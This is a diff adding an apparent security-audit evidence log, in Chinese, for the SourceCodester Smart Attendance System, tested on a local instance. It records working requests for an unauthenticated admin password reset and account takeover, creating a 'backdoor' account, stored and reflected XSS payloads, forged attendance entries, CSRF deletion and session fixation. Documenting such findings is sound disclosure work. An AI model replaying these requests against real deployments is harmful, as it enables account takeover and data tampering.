@@ -1,0 +1,54 @@
+# Smart Attendance System (SourceCodester #18702) — 动态验证证据记录
+# 环境: PHP 7.3.4 内置服务器 127.0.0.1:8899 + MySQL 5.7.26 (本地测试库 attendance_db)
+# 日期: 2026-10-17
+
+[T1] create_admin.php 未授权访问
+  GET /smart_attendance/create_admin.php (无 cookie) -> 200, 执行建表+插管理员, 回显 PDO 异常信息 ("User already exists or Error: ...")
+  => 无任何鉴权即执行管理员账户创建逻辑 (CWE-306)
+
+[T2] reset_password.php 未授权密码重置 (CWE-306) —— 核心
+  POST /smart_attendance/reset_password.php  (无 cookie)
+  body: username=admin&password=PwnedByAudit2026
+  resp: "Success! Password for user 'admin' has been updated."
+  => 未授权改写任意用户密码
+
+[T2b] 接管验证
+  POST /login.php username=admin&password=PwnedByAudit2026 -> 302 -> index.php
+  GET /index.php (带会话) -> 200, 含 "Dashboard" / "TOTAL STUDENTS"
+  => 管理员账户完全接管
+
+[T3] reset_password.php 未授权账户创建
+  POST /reset_password.php username=backdoor&password=backdoor123 (无 cookie)
+  resp: "User 'backdoor' was not found, so a NEW account was created with this password."
+  => 未授权创建任意新账户
+
+[T4] 公开注册携带 XSS 载荷学生 (student_signup.php 无鉴权)
+  POST /student_signup.php student_code=XTEST-001&full_name=<script>alert('XSS-POC')</script>...
+  resp: "Registration Successful!"
+  => 任意脚本载荷可入库
+
+[T5] 管理员登录并添加当日课程 (会话来自 T2b)
+
+[T6] attendance_handler.php 未授权考勤写入 (CWE-306)
+  POST /api/attendance_handler.php  student_code=XTEST-001   (无任何 cookie/会话)
+  resp: {"status":"success","message":"In: Audit Test (LATE)","student":"<script>alert('XSS-POC')<\/script>","time":"07:18 PM"}
+  DB: attendance_logs 新增 id=2, student_code=XTEST-001, type=IN, status=Late
+  => 未认证直接写考勤记录 (考勤造假); 同时存储载荷原样经 JSON 返回
+
+[T7] reset_password.php 反射 XSS (CWE-79)
+  POST /reset_password.php username=<img src=x onerror=alert('RXSS')>&password=x
+  resp HTML: Success! Password for user '<strong><img src=x onerror=alert('RXSS')></strong>' has been updated.
+  => 载荷原样反射进 HTML
+
+[T8] CSRF 删除学生 (CWE-352)
+  GET /delete_student.php?id=2  (仅带会话 cookie, 无任何 CSRF token)
+  -> 302 -> index.php; DB: students 中 XTEST-001 剩余行数 0
+  => 状态变更操作为 GET 且无 token, 可被跨站伪造
+
+[T9] 会话固定 (CWE-384)
+  预设 PHPSESSID=poegdill95lkakekmedc4a8tuh -> 管理员登录 -> 同一 ID 获得认证
+  GET /index.php (仅带该固定 cookie) -> 200 Dashboard
+  => 登录前后 session id 未轮换 (无 session_regenerate_id)
+
+[T10] 硬编码数据库凭据 (CWE-798) [静态]
+  includes/db.php:4-6  $host='localhost'; $user='root'; $pass='';
